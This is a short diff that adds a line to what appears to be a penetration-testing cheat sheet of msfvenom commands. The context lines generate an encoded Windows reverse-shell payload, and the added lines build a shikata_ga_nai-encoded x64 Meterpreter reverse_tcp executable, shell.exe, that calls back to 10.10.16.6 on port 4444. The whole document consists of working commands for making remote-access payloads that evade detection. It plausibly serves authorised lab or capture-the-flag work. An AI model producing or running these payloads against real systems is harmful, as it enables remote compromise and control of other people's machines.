@@ -28,3 +28,6 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 
 ```
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
 ```
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp --encoder x64/shikata_ga_nai LHOST=10.10.16.6 LPORT=4444 -f exe -o shell.exe 
+```
